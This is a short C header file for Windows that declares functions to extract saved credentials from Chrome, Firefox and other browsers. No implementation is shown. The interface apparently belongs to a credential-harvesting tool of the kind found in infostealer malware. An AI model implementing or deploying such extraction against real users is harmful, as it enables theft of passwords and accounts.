#ifndef BROWSER_H
#define BROWSER_H

#include <windows.h>

/**
 * Extract credentials from all supported browsers
 * @return Dynamically allocated string with all credentials (caller must free)
 */
char* extract_all_credentials(void);

/**
 * Extract credentials from Google Chrome
 * @return Dynamically allocated string with Chrome credentials (caller must free)
 */
char* extract_chrome_credentials(void);

/**
 * Extract credentials from Mozilla Firefox
 * @return Dynamically allocated string with Firefox credentials (caller must free)
 */
char* extract_firefox_credentials(void);

#endif // BROWSER_H
